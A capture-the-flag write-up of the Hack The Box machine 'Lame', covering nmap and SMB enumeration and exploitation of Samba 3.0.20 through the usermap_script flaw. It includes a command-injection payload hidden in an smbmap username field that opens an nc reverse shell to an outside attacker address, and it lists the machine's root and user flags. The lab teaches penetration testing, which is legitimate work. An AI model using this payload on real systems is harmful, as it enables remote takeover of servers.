# Enumeration

### Nmap:

Nmap -sC -sV 10.10.10.3 

21/tcp open ftp vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
| STAT:
| FTP server status:
| Connected to 10.10.14.32
| Logged in as ftp
| TYPE: ASCII
| No session bandwidth limit
| Session timeout in seconds is 300
| Control connection is plain text
| Data connections will be plain text
| vsFTPd 2.3.4 - secure, fast, stable
|*End of status
22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey:
| 1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|* 2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|*clock-skew: mean: -3d00h55m27s, deviation: 2h49m45s, median: -3d02h55m29s
| smb-os-discovery:
| OS: Unix (Samba 3.0.20-Debian)
| Computer name: lame
| NetBIOS computer name:
| Domain name: [hackthebox.gr](http://hackthebox.gr/)
| FQDN: [lame.hackthebox.gr](http://lame.hackthebox.gr/)
|* System time: 2020-10-03T16:28:49-04:00
| smb-security-mode:
| account_used: <blank>
| authentication_level: user
| challenge_response: supported
|_ message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

nmap —script smb-enum* -p 139,445 10.10.10.3

Host script results:
*| smb-enum-shares:
| account_used: <blank>
| \\10.10.10.3\ADMIN$:
| Type: STYPE_IPC
| Comment: IPC Service (lame server (Samba 3.0.20-Debian))
| Users: 1
| Max Users: <unlimited>*

*| Path: C:\tmp
| Anonymous access: <none>
| \\10.10.10.3\IPC$:
| Type: STYPE_IPC
| Comment: IPC Service (lame server (Samba 3.0.20-Debian))
| Users: 1
| Max Users: <unlimited>
| Path: C:\tmp
| Anonymous access: READ/WRITE*

*| \\10.10.10.3\opt:
| Type: STYPE_DISKTREE
| Comment:
| Users: 1
| Max Users: <unlimited>
| Path: C:\tmp
| Anonymous access: <none>*

*| \\10.10.10.3\print$:
| Type: STYPE_DISKTREE
| Comment: Printer Drivers
| Users: 1
| Max Users: <unlimited>
| Path: C:\var\lib\samba\printers
| Anonymous access: <none>*

*| \\10.10.10.3\tmp:
| Type: STYPE_DISKTREE
| Comment: oh noes!
| Users: 1
| Max Users: <unlimited>
| Path: C:\tmp
|* Anonymous access: READ/WRITE

### Ftp Connection

ftp 10.10.10.3

user = anonymous → no pass

user= ftp → no pass

Nothing to look on  FTP using those users. 

## Enum SMB

use scanner/smb/smb_enumusers → enumeration users

Result:

LAME [ games, nobody, bind, proxy, syslog, user, www-data, root, news, postgres, bin, mail, distccd, proftpd, dhcp, daemon, sshd, man, lp, mysql, gnats, libuuid, backup, msfadmin, telnetd, sys, klog, postfix, service, list, irc, ftp, tomcat55, sync, uucp ] ( LockoutTries=0 PasswordMin=5 )

smbmap -R 'tmp' -P 139 -H 10.10.10.3

smbmap -P 139 -H 10.10.10.3 —upload "local_file" 'tmp\name_file'

smbmap -P 139 -H 10.10.10.3 —delete 'tmp\name_file'

smbmap -P 139 -H 10.10.10.3 —download 'tmp\name_file'

msfconsole

use exploit/multi/samba/usermap_script

this exploit inject a payload at the smbmap username parameter, something like this:

smbmap -u "/=`nohup nc -nv 10.10.14.50 4444 -e /bin/bash`" -H 10.10.10.3 -P 139

And now we've root access, so be happy...

root.txt → 92caac3be140ef409e45721348a4e9df

user.txt → 69454a937d94f5f0225ea00acd2e84c5
